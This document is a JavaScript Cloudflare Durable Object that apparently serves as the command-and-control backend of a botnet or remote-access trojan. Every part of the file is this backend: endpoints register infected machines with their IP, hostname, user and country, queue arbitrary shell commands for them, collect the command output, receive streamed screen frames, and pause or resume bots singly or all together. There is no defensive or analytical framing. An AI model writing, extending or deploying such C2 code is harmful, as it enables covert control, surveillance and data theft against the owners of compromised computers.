// ============================================================
// 📋 RegistryDO — Durable Object with Pause/Resume
// ============================================================
export class RegistryDO {
  constructor(state, env) {
    this.state = state;
    this.bots = {};
    this.sessions = {};
    this.waitingPollers = {};
    this.pausedAll = false;

    this.state.blockConcurrencyWhile(async () => {
      this.bots = (await this.state.storage.get("bots")) || {};
      this.sessions = (await this.state.storage.get("sessions")) || {};
      this.pausedAll = (await this.state.storage.get("pausedAll")) || false;
    });
  }

  isOnline(bot) {
    return bot && Date.now() - bot.lastSeen < 30000;
  }

  async saveBots() {
    await this.state.storage.put("bots", this.bots);
  }

  updatePing(bot) {
    const prevSeen = bot.prevSeen || bot.lastSeen || Date.now();
    const pingValue = Math.max(0, Math.min(9999, Date.now() - prevSeen));
    bot.prevSeen = Date.now();
    bot.lastPing = pingValue;
    bot.pingHistory = bot.pingHistory || [];
    bot.pingHistory.push(pingValue);
    if (bot.pingHistory.length > 20) bot.pingHistory.shift();
    bot.lastSeen = Date.now();
  }

  getAvgPing(bot) {
    const recentPings = (bot.pingHistory || []).slice(-5);
    if (recentPings.length === 0) return 0;
    return Math.round(recentPings.reduce((a, b) => a + b, 0) / recentPings.length);
  }

  async notifyPollers(botId) {
    const pollers = this.waitingPollers[botId] || [];
    this.waitingPollers[botId] = [];
    
    for (const resolve of pollers) {
      try {
        resolve();
      } catch (e) {}
    }
  }

  async fetch(request) {
    const url = new URL(request.url);
    const path = url.pathname;

    try {
      // ═══════════════════════════════════════════════════════
      // 📝 Register (with Pause)
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/register") {
        const data = await request.json();
        if (!data.id) return Response.json({ status: "error" }, { status: 400 });

        // ═══ PAUSE ALL ═══
        if (this.pausedAll) {
          // استنى 25s (Cloudflare Limit)
          await new Promise((resolve) => setTimeout(resolve, 25000));
          return Response.json({ 
            status: "paused_all",
            paused: true,
          }, { status: 503 });
        }

        if (!this.bots[data.id]) {
          this.bots[data.id] = {
            commands: [],
            results: [],
            pinned: false,
            pingHistory: []
          };
        }

        const wasPaused = this.bots[data.id].info?.paused || false;
        
        // ═══ PAUSE BOT ═══
        if (wasPaused) {
          await new Promise((resolve) => setTimeout(resolve, 25000));
          return Response.json({ 
            status: "paused",
            paused: true,
          }, { status: 503 });
        }

        this.bots[data.id].info = {
          id: data.id,
          ip: data.ip || "unknown",
          hostname: data.hostname || "unknown",
          os: data.os || "unknown",
          user: data.user || "unknown",
          cwd: data.cwd || "/",
          country: data.country || "unknown",
          firstSeen: this.bots[data.id].info?.firstSeen || Date.now(),
          paused: wasPaused,
        };

        this.updatePing(this.bots[data.id]);
        await this.saveBots();
        return Response.json({ 
          status: "ok", 
          id: data.id,
          paused: wasPaused,
        });
      }

      // ═══════════════════════════════════════════════════════
      // 📥 Get Command (with Pause)
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/get_command") {
        const data = await request.json();
        const bot = this.bots[data.id];
        
        if (!bot) {
          return Response.json({ 
            status: "register_required",
            command: "",
          });
        }

        this.updatePing(bot);

        // ═══ PAUSE ALL ═══
        if (this.pausedAll) {
          await this.saveBots();
          // استنى 25s
          await new Promise((resolve) => setTimeout(resolve, 25000));
          return Response.json({ 
            status: "paused_all",
            command: "",
            paused: true,
          }, { status: 503 });
        }

        // ═══ PAUSE BOT ═══
        if (bot.info && bot.info.paused) {
          await this.saveBots();
          await new Promise((resolve) => setTimeout(resolve, 25000));
          return Response.json({ 
            status: "paused",
            command: "",
            paused: true,
          }, { status: 503 });
        }

        const now = Date.now();
        bot.commands = bot.commands.filter((c) => now - c.timestamp < 120000);

        if (bot.commands.length > 0) {
          const cmd = bot.commands.shift();
          await this.saveBots();
          return Response.json({ 
            status: "ok",
            command: cmd.cmd, 
            task_id: cmd.task_id,
          });
        }

        await this.saveBots();
        return Response.json({ 
          status: "ok",
          command: "",
        });
      }

      // ═══════════════════════════════════════════════════════
      // 📤 Send Result
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/send_result") {
        const data = await request.json();
        const bot = this.bots[data.bot_id];
        if (!bot) return Response.json({ status: "error" }, { status: 404 });

        bot.results.push({
          result: data.result || "",
          task_id: data.task_id || "unknown",
          timestamp: Date.now(),
        });
        this.updatePing(bot);
        if (data.cwd && bot.info) bot.info.cwd = data.cwd;

        await this.saveBots();
        return Response.json({ status: "ok" });
      }

      // ═══════════════════════════════════════════════════════
      // ✉️ Send Command
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/send_command") {
        const data = await request.json();
        const bot = this.bots[data.id];

        if (!bot) {
          return Response.json(
            { status: "error", message: "Bot not found" },
            { status: 404 }
          );
        }

        if (!this.isOnline(bot)) {
          return Response.json(
            {
              status: "error",
              message: "Bot is not connected. Command not saved.",
              botOnline: false,
            },
            { status: 400 }
          );
        }

        // ═══ PAUSE CHECK ═══
        if (this.pausedAll || (bot.info && bot.info.paused)) {
          return Response.json(
            {
              status: "error",
              message: "Bot is paused. Command not saved.",
              botPaused: true,
            },
            { status: 400 }
          );
        }

        const taskId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        bot.commands.push({
          cmd: data.cmd,
          timestamp: Date.now(),
          task_id: taskId,
        });

        await this.saveBots();
        await this.notifyPollers(data.id);

        return Response.json({
          status: "queued",
          task_id: taskId,
          botOnline: true,
        });
      }

      // ═══════════════════════════════════════════════════════
      // ⏸️ PAUSE BOT
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/pause") {
        const data = await request.json();
        const bot = this.bots[data.id];
        if (!bot) return Response.json({ status: "error" }, { status: 404 });
        
        if (!bot.info) bot.info = {};
        bot.info.paused = true;
        
        await this.saveBots();
        return Response.json({ status: "ok", paused: true });
      }

      if (path === "/bot/resume") {
        const data = await request.json();
        const bot = this.bots[data.id];
        if (!bot) return Response.json({ status: "error" }, { status: 404 });
        
        if (!bot.info) bot.info = {};
        bot.info.paused = false;
        
        await this.saveBots();
        return Response.json({ status: "ok", paused: false });
      }

      if (path === "/bot/pause_all") {
        this.pausedAll = true;
        await this.state.storage.put("pausedAll", true);
        return Response.json({ status: "ok", pausedAll: true });
      }

      if (path === "/bot/resume_all") {
        this.pausedAll = false;
        await this.state.storage.put("pausedAll", false);
        return Response.json({ status: "ok", pausedAll: false });
      }

      // ═══════════════════════════════════════════════════════
      // 📥 Get Result
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/get_result") {
        const data = await request.json();
        const bot = this.bots[data.id];
        if (!bot) return Response.json({ output: "" });

        if (bot.results.length > 0) {
          const r = bot.results.shift();
          await this.saveBots();
          return Response.json({ output: r.result, task_id: r.task_id });
        }
        return Response.json({ output: "", message: "No result yet" });
      }

      // ═══════════════════════════════════════════════════════
      // 🎥 Stream
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/stream_frame") {
        const data = await request.json();
        const bot = this.bots[data.bot_id];
        if (!bot) return Response.json({ status: "error" }, { status: 404 });

        bot.lastFrame = {
          frame: data.frame,
          timestamp: data.timestamp || Date.now()
        };
        this.updatePing(bot);

        await this.saveBots();
        return Response.json({ status: "ok" });
      }

      if (path === "/bot/get_frame") {
        const data = await request.json();
        const bot = this.bots[data.id];
        if (!bot || !bot.lastFrame) {
          return Response.json({ frame: null });
        }
        return Response.json({
          frame: bot.lastFrame.frame,
          timestamp: bot.lastFrame.timestamp,
          botId: data.id
        });
      }

      // ═══════════════════════════════════════════════════════
      // ℹ️ Info
      // ═══════════════════════════════════════════════════════
      if (path === "/bot/info") {
        const data = await request.json();
        const bot = this.bots[data.id];
        if (!bot || !bot.info) return Response.json({ exists: false });

        const avgPing = this.getAvgPing(bot);

        return Response.json({
          ...bot.info,
          lastSeen: bot.lastSeen,
          isOnline: this.isOnline(bot),
          pendingCommands: bot.commands.length,
          pendingResults: bot.results.length,
          pinned: bot.pinned || false,
          paused: bot.info.paused || false,
          pausedAll: this.pausedAll,
          ping: bot.isOnline && avgPing > 0 ? avgPing : null,
        });
      }

      if (path === "/bot/list") {
        const result = [];
        for (const id in this.bots) {
          const bot = this.bots[id];
          if (bot.info) {
            const avgPing = this.getAvgPing(bot);
            result.push({
              ...bot.info,
              lastSeen: bot.lastSeen,
              isOnline: this.isOnline(bot),
              pendingCommands: bot.commands.length,
              pendingResults: bot.results.length,
              pinned: bot.pinned || false,
              paused: bot.info.paused || false,
              pausedAll: this.pausedAll,
              ping: bot.isOnline && avgPing > 0 ? avgPing : null,
            });
          }
        }
        result.sort(function(a, b) {
          if (a.pinned && !b.pinned) return -1;
          if (!a.pinned && b.pinned) return 1;
          if (a.isOnline && !b.isOnline) return -1;
          if (!a.isOnline && b.isOnline) return 1;
          return (b.lastSeen || 0) - (a.lastSeen || 0);
        });
        return Response.json(result);
      }

      if (path === "/bot/pin") {
        const data = await request.json();
        const bot = this.bots[data.id];
        if (!bot) return Response.json({ status: "error" }, { status: 404 });

        bot.pinned = !bot.pinned;
        await this.saveBots();
        return Response.json({ status: "ok", pinned: bot.pinned });
      }

      if (path === "/bot/delete") {
        const data = await request.json();
        delete this.bots[data.id];
        await this.saveBots();
        return Response.json({ status: "ok" });
      }

      // ═══════════════════════════════════════════════════════
      // Sessions
      // ═══════════════════════════════════════════════════════
      if (path === "/session/save") {
        const data = await request.json();
        this.sessions[data.token] = { createdAt: Date.now() };
        await this.state.storage.put("sessions", this.sessions);
        return Response.json({ status: "ok" });
      }

      if (path === "/session/check") {
        const data = await request.json();
        const session = this.sessions[data.token];
        if (session && Date.now() - session.createdAt < 86400000) {
          return Response.json({ valid: true });
        }
        return Response.json({ valid: false });
      }

      return Response.json({ error: "Not Found", path }, { status: 404 });
    } catch (e) {
      return Response.json({ error: e.message }, { status: 500 });
    }
  }
}
